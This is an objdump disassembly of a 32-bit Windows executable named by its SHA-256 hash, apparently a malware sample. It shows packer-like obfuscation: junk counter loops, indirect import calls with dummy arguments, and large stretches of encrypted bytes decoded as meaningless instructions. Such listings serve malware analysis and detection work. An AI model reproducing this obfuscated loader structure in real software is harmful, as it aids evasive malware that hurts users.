
d96d3bdb1c92ad326074ab33b56210999c11ea3ec5b7bea6b2450c7746b109e1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433817,0x1c
  401013:	cmp    DWORD PTR ds:0x433817,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433817,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433817,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433817
  401055:	dec    eax
  401056:	mov    ds:0x433817,eax
  40105b:	mov    eax,ds:0x433817
  401060:	dec    eax
  401061:	mov    ds:0x433817,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43381b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43381f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433853
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43382f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433813
  4010b6:	mov    DWORD PTR ds:0x43382f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4338ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43382f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43382f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43382f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43382f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43382f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43382f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43382f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43382f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4337f7
  40113c:	mov    eax,ds:0x4338b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43389b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43377f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43379f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4337db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [ecx],ch
  4011b8:	retf   
  4011b9:	retf   
  4011ba:	mov    eax,0x7e7e7e7e
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [eax+0x0],ch
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x2fcdb73a
  40126d:	add    bl,dh
  40126f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401270:	jmp    0x76d7c207
  401275:	cmp    DWORD PTR [eax+0x27],edi
  401278:	adc    eax,0x86bcd203
  40127d:	dec    edi
  40127e:	fadd   QWORD PTR [esi]
  401280:	and    ebx,DWORD PTR [ebp-0x47]
  401283:	sti    
  401284:	push   es
  401285:	sbb    eax,0x27522db9
  40128a:	xor    DWORD PTR [edx],eax
  40128c:	xor    ch,BYTE PTR [ebx]
  40128e:	(bad)  
  40128f:	std    
  401290:	adc    al,0xd5
  401292:	call   0xb05b5219
  401297:	mov    es,edx
  401299:	stc    
  40129a:	xor    al,al
  40129c:	xchg   ebx,eax
  40129d:	fst    st(4)
  40129f:	mov    cs,WORD PTR [edx]
  4012a1:	mov    eax,0xdff5b8e8
  4012a6:	adc    eax,0xcdf462e8
  4012ab:	jae    0x401288
  4012ad:	jmp    0x21b8:0xfdfc55a6
  4012b4:	and    esi,ecx
  4012b6:	adc    DWORD PTR [ebx+0x6f],esi
  4012b9:	xor    ch,cl
  4012bb:	js     0x4012b6
  4012bd:	sti    
  4012be:	mov    eax,ds:0xe127a32a
  4012c3:	pusha  
  4012c4:	inc    eax
  4012c5:	mul    edi
  4012c7:	neg    cl
  4012c9:	jb     0x4012f2
  4012cb:	popf   
  4012cc:	xor    al,0x25
  4012ce:	adc    ebx,0x1c45c6e9
  4012d4:	dec    BYTE PTR ds:0xf70558d1
  4012da:	jbe    0x4012aa
  4012dc:	cmp    eax,0xad589fae
  4012e1:	jmp    0x4012d1
  4012e3:	sub    eax,0xf928b633
  4012e8:	push   ss
  4012e9:	pop    edx
  4012ea:	call   0x6d3fe9f7
  4012ef:	jb     0x4012cc
  4012f1:	test   al,0x37
  4012f3:	test   al,0x88
  4012f5:	pusha  
  4012f6:	lods   eax,DWORD PTR ds:[esi]
  4012f7:	and    esp,0xfffffff6
  4012fa:	or     eax,0x59b774b7
  4012ff:	pushf  
  401300:	cdq    
  401301:	adc    ecx,DWORD PTR [bx+di-0x33]
  401305:	ror    BYTE PTR [edx+ebx*1+0x32],cl
  401309:	push   eax
  40130a:	and    DWORD PTR [edi],0xb9d6969f
  401310:	ja     0x401317
  401312:	or     al,0x68
  401314:	(bad)  
  401315:	int    0x2c
  401317:	cmp    ebx,ebx
  401319:	mov    DWORD PTR [eax],ecx
  40131b:	rcl    dl,1
  40131d:	push   esi
  40131e:	cdq    
  40131f:	call   0xcbb2:0xbf3a856f
  401326:	in     eax,0x36
  401328:	add    dl,dh
  40132a:	or     al,BYTE PTR [ecx-0x4f]
  40132d:	xchg   DWORD PTR [ebx+eiz*4-0x1e2a9e14],edi
  401334:	xchg   ebp,eax
  401335:	lods   eax,DWORD PTR ds:[esi]
  401336:	imul   BYTE PTR [eax+0x63]
  401339:	sub    DWORD PTR [ebp+esi*4+0x3e3e5432],ecx
  401340:	iret   
  401341:	test   BYTE PTR ds:0xb4a5dbf6,ch
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x4337d3,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4337d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4337d3,ebx
  401366:	cmp    DWORD PTR ds:0x4337d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4337d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43378b,0x43377f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	ror    BYTE PTR [esi],1
  4013b5:	jle    0x401383
  4013b7:	cli    
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x40137d
  4013c0:	sbb    DWORD PTR [esi-0x30be3e31],edx
  4013c6:	mov    ah,0xa2
  4013c8:	test   al,0xc7
  4013ca:	mov    ebp,0xb1a0805
  4013cf:	shl    ebp,1
  4013d1:	inc    esp
  4013d2:	mov    cl,0xa2
  4013d4:	retf   0x3af3
  4013d7:	fwait
  4013d8:	push   eax
  4013d9:	stos   BYTE PTR es:[edi],al
  4013da:	lods   eax,DWORD PTR ds:[esi]
  4013db:	test   eax,0x6595c3cc
  4013e0:	mov    ah,0x52
  4013e2:	ins    BYTE PTR es:[edi],dx
  4013e3:	push   eax
  4013e4:	into   
  4013e5:	and    edx,DWORD PTR [eax]
  4013e7:	stc    
  4013e8:	sbb    eax,0x195b9245
  4013ed:	xor    al,0x82
  4013ef:	mov    bl,dl
  4013f1:	sti    
  4013f2:	xchg   edi,eax
  4013f3:	xor    ebp,esp
  4013f5:	adc    esp,eax
  4013f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013f8:	call   0xd51d105
  4013fd:	push   esi
  4013fe:	fucomp st(5)
  401400:	sbb    DWORD PTR ds:0x10e4a7a9,ebp
  401406:	enter  0x85e4,0x20
  40140a:	popa   
  40140b:	shl    BYTE PTR [edx+eax*1+0x6ce9746c],1
  401412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401413:	or     BYTE PTR [ebp+ebx*1-0x26fd37d7],dh
  40141a:	mov    cs,WORD PTR [ebx-0x1d758a32]
  401420:	retf   0x6590
  401423:	mov    esp,0xa6dc97fa
  401428:	add    eax,0x189456ec
  40142d:	mov    edi,0x881f99f5
  401432:	call   0x24ee:0x68ec34b3
  401439:	push   ecx
  40143a:	ins    BYTE PTR es:[edi],dx
  40143b:	mov    eax,0xc6c5d2ae
  401440:	dec    ebx
  401441:	xor    ch,ah
  401443:	into   
  401444:	mov    al,ds:0x19627db9
  401449:	mov    edi,0xecb820ae
  40144e:	and    eax,eax
  401450:	xchg   esp,ecx
  401452:	lahf   
  401453:	cmp    al,0x35
  401455:	pop    edx
  401456:	xor    DWORD PTR [eax+0x30],ebp
  401459:	out    dx,eax
  40145a:	or     al,0xa9
  40145c:	jmp    0xfa4a:0x48e5307f
  401463:	xchg   ecx,eax
  401464:	xchg   edx,eax
  401465:	les    esi,FWORD PTR [eax-0x68]
  401468:	pusha  
  401469:	jg     0x401420
  40146b:	xchg   ch,bh
  40146d:	fsub   QWORD PTR [edi-0x32e020d4]
  401473:	(bad)  
  401474:	(bad)  
  401476:	stc    
  401477:	adc    eax,0x2ece49b0
  40147c:	ss ins BYTE PTR es:[edi],dx
  40147e:	inc    ebp
  40147f:	push   ss
  401480:	shl    BYTE PTR [esi+0x76],1
  401483:	mov    ebp,db7
  401486:	call   0xa0dd:0x2ea30942
  40148d:	and    edi,DWORD PTR [ecx]
  40148f:	pop    ss
  401490:	out    0x4e,eax
  401492:	nop
  401493:	jo     0x401433
  401495:	or     eax,0x7aeb7a1e
  40149a:	inc    ebx
  40149b:	js     0x4014f9
  40149d:	sub    bh,BYTE PTR [edx+0x76]
  4014a0:	(bad)  
  4014a1:	or     BYTE PTR [ecx],ch
  4014a3:	addr16 test al,0x15
  4014a6:	push   ebx
  4014a7:	and    cl,BYTE PTR [eax]
  4014a9:	gs jae 0x4014d5
  4014ac:	or     al,dl
  4014ae:	add    ebp,ecx
  4014b0:	in     al,0xdb
  4014b2:	xchg   ecx,eax
  4014b3:	xchg   edi,eax
  4014b4:	jo     0x4014bf
  4014b6:	xlat   BYTE PTR ds:[ebx]
  4014b7:	imul   edi,DWORD PTR [ebp+0x1a],0x2
  4014bb:	push   ebx
  4014bc:	mov    dh,0x6a
  4014be:	in     al,0x54
  4014c0:	xchg   ebx,eax
  4014c1:	mov    dl,0x95
  4014c3:	xor    eax,0x1e317dd4
  4014c8:	(bad)  
  4014c9:	lock or BYTE PTR [ecx+0x2e],bl
  4014cd:	sar    BYTE PTR [edx+0x54a87fdc],1
  4014d3:	pop    ecx
  4014d4:	fstp   TBYTE PTR [ecx+0x74]
  4014d7:	inc    edx
  4014d8:	adc    cl,bl
  4014da:	loopne 0x401556
  4014dc:	fcomp  DWORD PTR [ecx]
  4014de:	sbb    al,0xa7
  4014e0:	pop    eax
  4014e1:	cld    
  4014e2:	adc    eax,0xe3ba1660
  4014e7:	bound  esp,QWORD PTR [edi+0x28]
  4014ea:	inc    ebp
  4014eb:	mov    esi,0x2d9a0be8
  4014f0:	cmp    eax,eax
  4014f2:	inc    ebp
  4014f3:	mov    eax,DWORD PTR [esi-0x5886bc6c]
  4014f9:	stos   DWORD PTR es:[edi],eax
  4014fa:	(bad)  
  4014fb:	inc    di
  4014fd:	cdq    
  4014fe:	jnp    0x4014ef
  401500:	push   ds
  401501:	inc    edi
  401502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401503:	xor    DWORD PTR [esi],eax
  401505:	xor    DWORD PTR [ebx-0x1c7d1e4],eax
  40150b:	pop    edx
  40150c:	cmp    cl,BYTE PTR [edx]
  40150e:	ins    DWORD PTR es:[edi],dx
  40150f:	and    eax,0xc692506
  401514:	and    DWORD PTR [edx-0x15],esp
  401517:	sbb    al,0xdf
  401519:	mov    edx,0xfbebd62
  40151e:	stos   BYTE PTR es:[edi],al
  40151f:	aas    
  401520:	adc    ah,ch
  401522:	jl     0x4014bf
  401524:	and    dh,BYTE PTR [esi]
  401526:	cmp    BYTE PTR [edx+0x3f27c9ba],ch
  40152c:	cmp    BYTE PTR [ebx+0x54cbca0f],cl
  401532:	call   0xa0d3367d
  401537:	mov    ebp,0xba7bb12a
  40153c:	sbb    bl,BYTE PTR [edi-0xd]
  40153f:	push   edx
  401540:	inc    eax
  401541:	int3   
  401542:	dec    ebx
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43378f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x20059d1d]
  401564:	xor    eax,DWORD PTR [esi]
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x401561
  40156e:	sub    al,0xae
  401570:	mov    ch,0xe8
  401572:	jp     0x4015a7
  401574:	(bad)  
  401575:	leave  
  401576:	test   BYTE PTR [ecx],bl
  401578:	mov    edx,ebx
  40157a:	or     DWORD PTR [eax+0x3],eax
  40157d:	je     0x401516
  40157f:	rol    bl,1
  401581:	and    eax,0x6a8c9393
  401586:	(bad)  
  401588:	mov    ebp,0xaf540559
  40158d:	cwde   
  40158e:	pop    ebp
  40158f:	push   ds
  401590:	pop    edx
  401591:	jno    0x40155f
  401593:	adc    ebx,DWORD PTR [ebx]
  401595:	ja     0x40158c
  401597:	mov    ah,0x88
  401599:	mov    ds:0x1ce8dd6,al
  40159e:	shr    bl,0x84
  4015a1:	sbb    ecx,DWORD PTR [esi]
  4015a3:	add    al,0x8
  4015a5:	rcl    ecx,cl
  4015a7:	pop    ds
  4015a8:	mov    BYTE PTR [edx],bh
  4015aa:	jbe    0x4015cf
  4015ac:	sbb    eax,esi
  4015ae:	add    al,BYTE PTR [edi]
  4015b0:	repnz ficomp WORD PTR [edi-0x45]
  4015b4:	in     al,dx
  4015b5:	jbe    0x4015fd
  4015b7:	mov    bh,BYTE PTR [eax+0x31]
  4015ba:	inc    ebx
  4015bb:	or     eax,0x117c4de6
  4015c0:	mov    BYTE PTR fs:[eax-0x13],ah
  4015c4:	and    DWORD PTR [ebx],eax
  4015c6:	pop    eax
  4015c7:	rsqrtps xmm4,XMMWORD PTR [ecx]
  4015ca:	jmp    0x4015a2
  4015cc:	dec    ecx
  4015cd:	jge    0x4015a9
  4015cf:	mov    ah,BYTE PTR [ebp+0x1d652bdf]
  4015d5:	sub    BYTE PTR [ebx],dh
  4015d7:	mov    edx,0xd02df2de
  4015dc:	xor    ebp,DWORD PTR [eax]
  4015de:	dec    ecx
  4015df:	iret   
  4015e0:	jle    0x40157e
  4015e2:	dec    ecx
  4015e3:	mov    al,ds:0x45b8ecef
  4015e8:	(bad)  
  4015e9:	xor    bh,dl
  4015eb:	shl    DWORD PTR [ebx-0x2b6dd9d3],cl
  4015f1:	out    dx,al
  4015f2:	add    eax,0x27e92c3e
  4015f7:	mov    ds:0xff33174a,eax
  4015fc:	jne    0x401609
  4015fe:	bound  edx,QWORD PTR [ecx-0x5a284a90]
  401604:	add    BYTE PTR [edx-0x26b527ed],bh
  40160a:	mov    al,BYTE PTR [ecx+0x7f010d97]
  401610:	push   esi
  401611:	or     eax,0x9ef557ea
  401616:	inc    ecx
  401617:	fs cs test eax,0x17bc42c6
  40161e:	(bad)  
  40161f:	stos   BYTE PTR es:[edi],al
  401620:	jmp    0xdc20dbe0
  401625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401626:	test   DWORD PTR [eax+ebx*2+0x54],edi
  40162a:	punpckhbw mm3,QWORD PTR [edi-0x69]
  40162e:	sbb    DWORD PTR [ecx-0x6b],esp
  401631:	add    al,BYTE PTR [edx+ebx*2+0x56]
  401635:	dec    ebx
  401636:	repnz cmp al,BYTE PTR [ebx-0x49]
  40163a:	push   ds
  40163b:	xlat   BYTE PTR ds:[ebx]
  40163c:	test   ecx,0x3b5debd3
  401642:	jmp    0x4016bf
  401644:	mov    edx,0x79a5f4b5
  401649:	into   
  40164a:	jg     0x401648
  40164c:	loop   0x40169f
  40164e:	shl    bl,0x38
  401651:	adc    ch,ch
  401653:	rol    BYTE PTR [ebx+ebp*4+0x16860f9b],cl
  40165a:	in     eax,dx
  40165b:	data16 cmp ah,dl
  40165e:	out    0x33,al
  401660:	mov    ebx,DWORD PTR [edi+0x28]
  401663:	sbb    al,0x9a
  401665:	dec    edi
  401666:	inc    eax
  401667:	std    
  401668:	js     0x401629
  40166a:	add    BYTE PTR [edi-0x1d],bl
  40166d:	adc    bl,BYTE PTR [ebx+0x7c]
  401670:	outs   dx,BYTE PTR ds:[esi]
  401671:	xchg   BYTE PTR [edx],ch
  401673:	clc    
  401674:	mov    ds:0xfaae0273,al
  401679:	push   es
  40167a:	xchg   ebx,eax
  40167b:	cmp    dl,BYTE PTR [edi-0x7894c52a]
  401681:	and    al,BYTE PTR [esi+0x43]
  401684:	rol    DWORD PTR [si],0x49
  401688:	fcmovnu st,st(7)
  40168a:	repz out 0x8a,eax
  40168d:	sbb    eax,0x6021962a
  401692:	mov    ds:0x2fc41784,al
  401697:	xchg   ebp,eax
  401698:	xor    cl,bh
  40169a:	xor    ah,BYTE PTR [ebp-0x48]
  40169d:	in     eax,0xd7
  40169f:	ret    
  4016a0:	mov    cl,0xbc
  4016a2:	repnz mov DWORD PTR [edi],ebp
  4016a5:	and    al,0x9c
  4016a7:	data16 addr16 stc 
  4016aa:	cmp    al,0xc5
  4016ac:	fucom  st(2)
  4016ae:	pop    ds
  4016af:	jecxz  0x40171a
  4016b1:	mov    BYTE PTR [ecx-0x9],al
  4016b4:	repz fwait
  4016b6:	mov    dl,0x1
  4016b8:	inc    esp
  4016b9:	sbb    al,0x74
  4016bb:	inc    edx
  4016bc:	inc    eax
  4016bd:	inc    ecx
  4016be:	leavew 
  4016c0:	adc    DWORD PTR [edi+0x34c7916b],0xffffffbc
  4016c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c8:	xor    al,0x8f
  4016ca:	jb     0x4016a6
  4016cc:	push   ss
  4016cd:	mov    bh,0x93
  4016cf:	loopne 0x4016f5
  4016d1:	aas    
  4016d2:	in     eax,0x4
  4016d4:	adc    eax,0xee7d1bc7
  4016d9:	adc    dl,BYTE PTR [eax-0x2d]
  4016dc:	cwde   
  4016dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016de:	popf   
  4016df:	shl    eax,cl
  4016e1:	loop   0x4016d2
  4016e3:	iret   
  4016e4:	and    ah,BYTE PTR [esp+edx*8-0x791a529]
  4016eb:	in     eax,0xc1
  4016ed:	pop    es
  4016ee:	aaa    
  4016ef:	outs   dx,BYTE PTR ds:[esi]
  4016f0:	pop    esi
  4016f1:	add    eax,edi
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43385f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43385f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43385f,ebx
  401721:	cmp    DWORD PTR ds:0x43385f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43385f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43385f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43385f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43385f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433783,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433797
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43378b
  401793:	and    ecx,DWORD PTR ds:0x4337db
  401799:	mov    DWORD PTR ds:0x43378b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4338af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4338af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4338af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4338af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4338af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4338af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4338af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4338af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433863,0x0
  401819:	mov    eax,ds:0x433863
  40181e:	inc    eax
  40181f:	mov    ds:0x433863,eax
  401824:	cmp    DWORD PTR ds:0x433863,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4337a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433863,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43389f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4338ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4338ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4338ab,ecx
  401878:	cmp    DWORD PTR ds:0x4338ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4338ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4338ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4338ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4338ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xdb836ade
  4018e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018ea:	stos   DWORD PTR es:[edi],eax
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x401941
  4018f4:	mov    dh,0xb6
  4018f6:	mov    eax,cs:0x289f6438
  4018fc:	ret    
  4018fd:	dec    ecx
  4018fe:	jno    0x4018dd
  401900:	fsub   QWORD PTR [esi]
  401902:	pushf  
  401903:	inc    edx
  401904:	pushf  
  401905:	pop    edi
  401906:	lea    bp,[eax+0x1d]
  40190a:	loope  0x401894
  40190c:	mov    ch,0x10
  40190e:	out    0x3e,al
  401910:	shl    DWORD PTR [ebx+ecx*1+0x45bc09be],0x1a
  401918:	lock cmp edx,DWORD PTR [ebx]
  40191b:	outs   dx,BYTE PTR ds:[esi]
  40191c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40191d:	sbb    DWORD PTR [esi+ebp*8+0x56],0xae074513
  401925:	aam    0x6
  401927:	out    0x3b,eax
  401929:	clc    
  40192a:	xchg   esp,eax
  40192b:	add    BYTE PTR [edx],0x97
  40192e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40192f:	xor    bh,dl
  401931:	leave  
  401932:	popa   
  401933:	lods   eax,DWORD PTR ds:[esi]
  401934:	(bad)  
  401935:	jge    0x4018c4
  401937:	jecxz  0x401938
  401939:	jns    0x40194c
  40193b:	aam    0x39
  40193d:	xchg   esp,eax
  40193e:	lods   eax,DWORD PTR ds:[esi]
  40193f:	mul    dl
  401941:	mov    dh,0x8b
  401943:	ret    
  401944:	sahf   
  401945:	fistp  DWORD PTR [esp+ebp*4-0x1e]
  401949:	mov    DWORD PTR [ebx+0x2e97f7a1],esi
  40194f:	ds in  eax,0xc1
  401952:	adc    edi,DWORD PTR ds:0x9009321b
  401958:	ins    BYTE PTR es:[edi],dx
  401959:	mov    bl,0xd6
  40195b:	jno    0x401913
  40195d:	xor    esp,ebx
  40195f:	je     0x615f5465
  401965:	vandnps xmm2,xmm5,XMMWORD PTR [esi-0x5c]
